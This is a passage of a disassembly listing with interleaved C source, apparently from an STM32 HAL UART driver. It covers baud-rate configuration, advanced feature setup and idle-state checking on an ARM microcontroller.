 8005a18:	4b4c      	ldr	r3, [pc, #304]	; (8005b4c <UART_SetConfig+0x454>)
 8005a1a:	61fb      	str	r3, [r7, #28]
        break;
 8005a1c:	e00d      	b.n	8005a3a <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005a1e:	f7fe fd3d 	bl	800449c <HAL_RCC_GetSysClockFreq>
 8005a22:	61f8      	str	r0, [r7, #28]
        break;
 8005a24:	e009      	b.n	8005a3a <UART_SetConfig+0x342>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005a26:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005a2a:	61fb      	str	r3, [r7, #28]
        break;
 8005a2c:	e005      	b.n	8005a3a <UART_SetConfig+0x342>
      default:
        pclk = 0U;
 8005a2e:	2300      	movs	r3, #0
 8005a30:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005a32:	2301      	movs	r3, #1
 8005a34:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005a38:	bf00      	nop
    }

    /* USARTDIV must be greater than or equal to 0d16 */
    if (pclk != 0U)
 8005a3a:	69fb      	ldr	r3, [r7, #28]
 8005a3c:	2b00      	cmp	r3, #0
 8005a3e:	d077      	beq.n	8005b30 <UART_SetConfig+0x438>
    {
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING8(pclk, huart->Init.BaudRate));
 8005a40:	69fb      	ldr	r3, [r7, #28]
 8005a42:	005a      	lsls	r2, r3, #1
 8005a44:	68fb      	ldr	r3, [r7, #12]
 8005a46:	685b      	ldr	r3, [r3, #4]
 8005a48:	085b      	lsrs	r3, r3, #1
 8005a4a:	441a      	add	r2, r3
 8005a4c:	68fb      	ldr	r3, [r7, #12]
 8005a4e:	685b      	ldr	r3, [r3, #4]
 8005a50:	fbb2 f3f3 	udiv	r3, r2, r3
 8005a54:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005a56:	69bb      	ldr	r3, [r7, #24]
 8005a58:	2b0f      	cmp	r3, #15
 8005a5a:	d916      	bls.n	8005a8a <UART_SetConfig+0x392>
 8005a5c:	69bb      	ldr	r3, [r7, #24]
 8005a5e:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005a62:	d212      	bcs.n	8005a8a <UART_SetConfig+0x392>
      {
        brrtemp = (uint16_t)(usartdiv & 0xFFF0U);
 8005a64:	69bb      	ldr	r3, [r7, #24]
 8005a66:	b29b      	uxth	r3, r3
 8005a68:	f023 030f 	bic.w	r3, r3, #15
 8005a6c:	82fb      	strh	r3, [r7, #22]
        brrtemp |= (uint16_t)((usartdiv & (uint16_t)0x000FU) >> 1U);
 8005a6e:	69bb      	ldr	r3, [r7, #24]
 8005a70:	085b      	lsrs	r3, r3, #1
 8005a72:	b29b      	uxth	r3, r3
 8005a74:	f003 0307 	and.w	r3, r3, #7
 8005a78:	b29a      	uxth	r2, r3
 8005a7a:	8afb      	ldrh	r3, [r7, #22]
 8005a7c:	4313      	orrs	r3, r2
 8005a7e:	82fb      	strh	r3, [r7, #22]
        huart->Instance->BRR = brrtemp;
 8005a80:	68fb      	ldr	r3, [r7, #12]
 8005a82:	681b      	ldr	r3, [r3, #0]
 8005a84:	8afa      	ldrh	r2, [r7, #22]
 8005a86:	60da      	str	r2, [r3, #12]
 8005a88:	e052      	b.n	8005b30 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005a8a:	2301      	movs	r3, #1
 8005a8c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
 8005a90:	e04e      	b.n	8005b30 <UART_SetConfig+0x438>
      }
    }
  }
  else
  {
    switch (clocksource)
 8005a92:	f897 3023 	ldrb.w	r3, [r7, #35]	; 0x23
 8005a96:	2b08      	cmp	r3, #8
 8005a98:	d827      	bhi.n	8005aea <UART_SetConfig+0x3f2>
 8005a9a:	a201      	add	r2, pc, #4	; (adr r2, 8005aa0 <UART_SetConfig+0x3a8>)
 8005a9c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 8005aa0:	08005ac5 	.word	0x08005ac5
 8005aa4:	08005acd 	.word	0x08005acd
 8005aa8:	08005ad5 	.word	0x08005ad5
 8005aac:	08005aeb 	.word	0x08005aeb
 8005ab0:	08005adb 	.word	0x08005adb
 8005ab4:	08005aeb 	.word	0x08005aeb
 8005ab8:	08005aeb 	.word	0x08005aeb
 8005abc:	08005aeb 	.word	0x08005aeb
 8005ac0:	08005ae3 	.word	0x08005ae3
    {
      case UART_CLOCKSOURCE_PCLK1:
        pclk = HAL_RCC_GetPCLK1Freq();
 8005ac4:	f7fe fd82 	bl	80045cc <HAL_RCC_GetPCLK1Freq>
 8005ac8:	61f8      	str	r0, [r7, #28]
        break;
 8005aca:	e014      	b.n	8005af6 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_PCLK2:
        pclk = HAL_RCC_GetPCLK2Freq();
 8005acc:	f7fe fd94 	bl	80045f8 <HAL_RCC_GetPCLK2Freq>
 8005ad0:	61f8      	str	r0, [r7, #28]
        break;
 8005ad2:	e010      	b.n	8005af6 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_HSI:
        pclk = (uint32_t) HSI_VALUE;
 8005ad4:	4b1d      	ldr	r3, [pc, #116]	; (8005b4c <UART_SetConfig+0x454>)
 8005ad6:	61fb      	str	r3, [r7, #28]
        break;
 8005ad8:	e00d      	b.n	8005af6 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_SYSCLK:
        pclk = HAL_RCC_GetSysClockFreq();
 8005ada:	f7fe fcdf 	bl	800449c <HAL_RCC_GetSysClockFreq>
 8005ade:	61f8      	str	r0, [r7, #28]
        break;
 8005ae0:	e009      	b.n	8005af6 <UART_SetConfig+0x3fe>
      case UART_CLOCKSOURCE_LSE:
        pclk = (uint32_t) LSE_VALUE;
 8005ae2:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8005ae6:	61fb      	str	r3, [r7, #28]
        break;
 8005ae8:	e005      	b.n	8005af6 <UART_SetConfig+0x3fe>
      default:
        pclk = 0U;
 8005aea:	2300      	movs	r3, #0
 8005aec:	61fb      	str	r3, [r7, #28]
        ret = HAL_ERROR;
 8005aee:	2301      	movs	r3, #1
 8005af0:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
        break;
 8005af4:	bf00      	nop
    }

    if (pclk != 0U)
 8005af6:	69fb      	ldr	r3, [r7, #28]
 8005af8:	2b00      	cmp	r3, #0
 8005afa:	d019      	beq.n	8005b30 <UART_SetConfig+0x438>
    {
      /* USARTDIV must be greater than or equal to 0d16 */
#if defined(USART_PRESC_PRESCALER)
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate, huart->Init.ClockPrescaler));
#else
      usartdiv = (uint32_t)(UART_DIV_SAMPLING16(pclk, huart->Init.BaudRate));
 8005afc:	68fb      	ldr	r3, [r7, #12]
 8005afe:	685b      	ldr	r3, [r3, #4]
 8005b00:	085a      	lsrs	r2, r3, #1
 8005b02:	69fb      	ldr	r3, [r7, #28]
 8005b04:	441a      	add	r2, r3
 8005b06:	68fb      	ldr	r3, [r7, #12]
 8005b08:	685b      	ldr	r3, [r3, #4]
 8005b0a:	fbb2 f3f3 	udiv	r3, r2, r3
 8005b0e:	61bb      	str	r3, [r7, #24]
#endif /* USART_PRESC_PRESCALER */
      if ((usartdiv >= UART_BRR_MIN) && (usartdiv <= UART_BRR_MAX))
 8005b10:	69bb      	ldr	r3, [r7, #24]
 8005b12:	2b0f      	cmp	r3, #15
 8005b14:	d909      	bls.n	8005b2a <UART_SetConfig+0x432>
 8005b16:	69bb      	ldr	r3, [r7, #24]
 8005b18:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8005b1c:	d205      	bcs.n	8005b2a <UART_SetConfig+0x432>
      {
        huart->Instance->BRR = (uint16_t)usartdiv;
 8005b1e:	69bb      	ldr	r3, [r7, #24]
 8005b20:	b29a      	uxth	r2, r3
 8005b22:	68fb      	ldr	r3, [r7, #12]
 8005b24:	681b      	ldr	r3, [r3, #0]
 8005b26:	60da      	str	r2, [r3, #12]
 8005b28:	e002      	b.n	8005b30 <UART_SetConfig+0x438>
      }
      else
      {
        ret = HAL_ERROR;
 8005b2a:	2301      	movs	r3, #1
 8005b2c:	f887 3022 	strb.w	r3, [r7, #34]	; 0x22
  huart->NbTxDataToProcess = 1;
  huart->NbRxDataToProcess = 1;
#endif /* USART_CR1_FIFOEN */

  /* Clear ISR function pointers */
  huart->RxISR = NULL;
 8005b30:	68fb      	ldr	r3, [r7, #12]
 8005b32:	2200      	movs	r2, #0
 8005b34:	669a      	str	r2, [r3, #104]	; 0x68
  huart->TxISR = NULL;
 8005b36:	68fb      	ldr	r3, [r7, #12]
 8005b38:	2200      	movs	r2, #0
 8005b3a:	66da      	str	r2, [r3, #108]	; 0x6c

  return ret;
 8005b3c:	f897 3022 	ldrb.w	r3, [r7, #34]	; 0x22
}
 8005b40:	4618      	mov	r0, r3
 8005b42:	3728      	adds	r7, #40	; 0x28
 8005b44:	46bd      	mov	sp, r7
 8005b46:	e8bd 8fb0 	ldmia.w	sp!, {r4, r5, r7, r8, r9, sl, fp, pc}
 8005b4a:	bf00      	nop
 8005b4c:	00f42400 	.word	0x00f42400

08005b50 <UART_AdvFeatureConfig>:
  * @brief Configure the UART peripheral advanced features.
  * @param huart UART handle.
  * @retval None
  */
void UART_AdvFeatureConfig(UART_HandleTypeDef *huart)
{
 8005b50:	b480      	push	{r7}
 8005b52:	b083      	sub	sp, #12
 8005b54:	af00      	add	r7, sp, #0
 8005b56:	6078      	str	r0, [r7, #4]
  /* Check whether the set of advanced features to configure is properly set */
  assert_param(IS_UART_ADVFEATURE_INIT(huart->AdvancedInit.AdvFeatureInit));

  /* if required, configure RX/TX pins swap */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 8005b58:	687b      	ldr	r3, [r7, #4]
 8005b5a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005b5c:	f003 0308 	and.w	r3, r3, #8
 8005b60:	2b00      	cmp	r3, #0
 8005b62:	d00a      	beq.n	8005b7a <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 8005b64:	687b      	ldr	r3, [r7, #4]
 8005b66:	681b      	ldr	r3, [r3, #0]
 8005b68:	685b      	ldr	r3, [r3, #4]
 8005b6a:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 8005b6e:	687b      	ldr	r3, [r7, #4]
 8005b70:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 8005b72:	687b      	ldr	r3, [r7, #4]
 8005b74:	681b      	ldr	r3, [r3, #0]
 8005b76:	430a      	orrs	r2, r1
 8005b78:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 8005b7a:	687b      	ldr	r3, [r7, #4]
 8005b7c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005b7e:	f003 0301 	and.w	r3, r3, #1
 8005b82:	2b00      	cmp	r3, #0
 8005b84:	d00a      	beq.n	8005b9c <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 8005b86:	687b      	ldr	r3, [r7, #4]
 8005b88:	681b      	ldr	r3, [r3, #0]
 8005b8a:	685b      	ldr	r3, [r3, #4]
 8005b8c:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 8005b90:	687b      	ldr	r3, [r7, #4]
 8005b92:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 8005b94:	687b      	ldr	r3, [r7, #4]
 8005b96:	681b      	ldr	r3, [r3, #0]
 8005b98:	430a      	orrs	r2, r1
 8005b9a:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 8005b9c:	687b      	ldr	r3, [r7, #4]
 8005b9e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005ba0:	f003 0302 	and.w	r3, r3, #2
 8005ba4:	2b00      	cmp	r3, #0
 8005ba6:	d00a      	beq.n	8005bbe <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 8005ba8:	687b      	ldr	r3, [r7, #4]
 8005baa:	681b      	ldr	r3, [r3, #0]
 8005bac:	685b      	ldr	r3, [r3, #4]
 8005bae:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 8005bb2:	687b      	ldr	r3, [r7, #4]
 8005bb4:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 8005bb6:	687b      	ldr	r3, [r7, #4]
 8005bb8:	681b      	ldr	r3, [r3, #0]
 8005bba:	430a      	orrs	r2, r1
 8005bbc:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 8005bbe:	687b      	ldr	r3, [r7, #4]
 8005bc0:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005bc2:	f003 0304 	and.w	r3, r3, #4
 8005bc6:	2b00      	cmp	r3, #0
 8005bc8:	d00a      	beq.n	8005be0 <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005bca:	687b      	ldr	r3, [r7, #4]
 8005bcc:	681b      	ldr	r3, [r3, #0]
 8005bce:	685b      	ldr	r3, [r3, #4]
 8005bd0:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 8005bd4:	687b      	ldr	r3, [r7, #4]
 8005bd6:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005bd8:	687b      	ldr	r3, [r7, #4]
 8005bda:	681b      	ldr	r3, [r3, #0]
 8005bdc:	430a      	orrs	r2, r1
 8005bde:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 8005be0:	687b      	ldr	r3, [r7, #4]
 8005be2:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005be4:	f003 0310 	and.w	r3, r3, #16
 8005be8:	2b00      	cmp	r3, #0
 8005bea:	d00a      	beq.n	8005c02 <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005bec:	687b      	ldr	r3, [r7, #4]
 8005bee:	681b      	ldr	r3, [r3, #0]
 8005bf0:	689b      	ldr	r3, [r3, #8]
 8005bf2:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005bf6:	687b      	ldr	r3, [r7, #4]
 8005bf8:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005bfa:	687b      	ldr	r3, [r7, #4]
 8005bfc:	681b      	ldr	r3, [r3, #0]
 8005bfe:	430a      	orrs	r2, r1
 8005c00:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005c02:	687b      	ldr	r3, [r7, #4]
 8005c04:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c06:	f003 0320 	and.w	r3, r3, #32
 8005c0a:	2b00      	cmp	r3, #0
 8005c0c:	d00a      	beq.n	8005c24 <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005c0e:	687b      	ldr	r3, [r7, #4]
 8005c10:	681b      	ldr	r3, [r3, #0]
 8005c12:	689b      	ldr	r3, [r3, #8]
 8005c14:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005c18:	687b      	ldr	r3, [r7, #4]
 8005c1a:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005c1c:	687b      	ldr	r3, [r7, #4]
 8005c1e:	681b      	ldr	r3, [r3, #0]
 8005c20:	430a      	orrs	r2, r1
 8005c22:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005c24:	687b      	ldr	r3, [r7, #4]
 8005c26:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c28:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005c2c:	2b00      	cmp	r3, #0
 8005c2e:	d01a      	beq.n	8005c66 <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005c30:	687b      	ldr	r3, [r7, #4]
 8005c32:	681b      	ldr	r3, [r3, #0]
 8005c34:	685b      	ldr	r3, [r3, #4]
 8005c36:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005c3a:	687b      	ldr	r3, [r7, #4]
 8005c3c:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005c3e:	687b      	ldr	r3, [r7, #4]
 8005c40:	681b      	ldr	r3, [r3, #0]
 8005c42:	430a      	orrs	r2, r1
 8005c44:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005c46:	687b      	ldr	r3, [r7, #4]
 8005c48:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005c4a:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005c4e:	d10a      	bne.n	8005c66 <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005c50:	687b      	ldr	r3, [r7, #4]
 8005c52:	681b      	ldr	r3, [r3, #0]
 8005c54:	685b      	ldr	r3, [r3, #4]
 8005c56:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005c5a:	687b      	ldr	r3, [r7, #4]
 8005c5c:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005c5e:	687b      	ldr	r3, [r7, #4]
 8005c60:	681b      	ldr	r3, [r3, #0]
 8005c62:	430a      	orrs	r2, r1
 8005c64:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005c66:	687b      	ldr	r3, [r7, #4]
 8005c68:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005c6a:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005c6e:	2b00      	cmp	r3, #0
 8005c70:	d00a      	beq.n	8005c88 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005c72:	687b      	ldr	r3, [r7, #4]
 8005c74:	681b      	ldr	r3, [r3, #0]
 8005c76:	685b      	ldr	r3, [r3, #4]
 8005c78:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005c7c:	687b      	ldr	r3, [r7, #4]
 8005c7e:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005c80:	687b      	ldr	r3, [r7, #4]
 8005c82:	681b      	ldr	r3, [r3, #0]
 8005c84:	430a      	orrs	r2, r1
 8005c86:	605a      	str	r2, [r3, #4]
  }
}
 8005c88:	bf00      	nop
 8005c8a:	370c      	adds	r7, #12
 8005c8c:	46bd      	mov	sp, r7
 8005c8e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005c92:	4770      	bx	lr

08005c94 <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005c94:	b580      	push	{r7, lr}
 8005c96:	b098      	sub	sp, #96	; 0x60
 8005c98:	af02      	add	r7, sp, #8
 8005c9a:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005c9c:	687b      	ldr	r3, [r7, #4]
 8005c9e:	2200      	movs	r2, #0
 8005ca0:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005ca4:	f7fb fb62 	bl	800136c <HAL_GetTick>
 8005ca8:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005caa:	687b      	ldr	r3, [r7, #4]
 8005cac:	681b      	ldr	r3, [r3, #0]
 8005cae:	681b      	ldr	r3, [r3, #0]
 8005cb0:	f003 0308 	and.w	r3, r3, #8
 8005cb4:	2b08      	cmp	r3, #8
 8005cb6:	d12e      	bne.n	8005d16 <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005cb8:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005cbc:	9300      	str	r3, [sp, #0]
 8005cbe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005cc0:	2200      	movs	r2, #0
 8005cc2:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005cc6:	6878      	ldr	r0, [r7, #4]
 8005cc8:	f000 f88c 	bl	8005de4 <UART_WaitOnFlagUntilTimeout>
 8005ccc:	4603      	mov	r3, r0
 8005cce:	2b00      	cmp	r3, #0
 8005cd0:	d021      	beq.n	8005d16 <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005cd2:	687b      	ldr	r3, [r7, #4]
 8005cd4:	681b      	ldr	r3, [r3, #0]
 8005cd6:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005cd8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005cda:	e853 3f00 	ldrex	r3, [r3]
 8005cde:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005ce0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005ce2:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005ce6:	653b      	str	r3, [r7, #80]	; 0x50
 8005ce8:	687b      	ldr	r3, [r7, #4]
 8005cea:	681b      	ldr	r3, [r3, #0]
 8005cec:	461a      	mov	r2, r3
 8005cee:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005cf0:	647b      	str	r3, [r7, #68]	; 0x44
 8005cf2:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005cf4:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005cf6:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005cf8:	e841 2300 	strex	r3, r2, [r1]
 8005cfc:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005cfe:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005d00:	2b00      	cmp	r3, #0
 8005d02:	d1e6      	bne.n	8005cd2 <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005d04:	687b      	ldr	r3, [r7, #4]
 8005d06:	2220      	movs	r2, #32
 8005d08:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005d0a:	687b      	ldr	r3, [r7, #4]
 8005d0c:	2200      	movs	r2, #0
 8005d0e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005d12:	2303      	movs	r3, #3
 8005d14:	e062      	b.n	8005ddc <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005d16:	687b      	ldr	r3, [r7, #4]
 8005d18:	681b      	ldr	r3, [r3, #0]
 8005d1a:	681b      	ldr	r3, [r3, #0]
 8005d1c:	f003 0304 	and.w	r3, r3, #4
 8005d20:	2b04      	cmp	r3, #4
 8005d22:	d149      	bne.n	8005db8 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005d24:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005d28:	9300      	str	r3, [sp, #0]
 8005d2a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005d2c:	2200      	movs	r2, #0
 8005d2e:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005d32:	6878      	ldr	r0, [r7, #4]
 8005d34:	f000 f856 	bl	8005de4 <UART_WaitOnFlagUntilTimeout>
 8005d38:	4603      	mov	r3, r0
 8005d3a:	2b00      	cmp	r3, #0
 8005d3c:	d03c      	beq.n	8005db8 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005d3e:	687b      	ldr	r3, [r7, #4]
 8005d40:	681b      	ldr	r3, [r3, #0]
 8005d42:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005d44:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005d46:	e853 3f00 	ldrex	r3, [r3]
 8005d4a:	623b      	str	r3, [r7, #32]
   return(result);
 8005d4c:	6a3b      	ldr	r3, [r7, #32]
 8005d4e:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005d52:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005d54:	687b      	ldr	r3, [r7, #4]
 8005d56:	681b      	ldr	r3, [r3, #0]
 8005d58:	461a      	mov	r2, r3
 8005d5a:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005d5c:	633b      	str	r3, [r7, #48]	; 0x30
 8005d5e:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005d60:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005d62:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005d64:	e841 2300 	strex	r3, r2, [r1]
 8005d68:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005d6a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005d6c:	2b00      	cmp	r3, #0
 8005d6e:	d1e6      	bne.n	8005d3e <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005d70:	687b      	ldr	r3, [r7, #4]
 8005d72:	681b      	ldr	r3, [r3, #0]
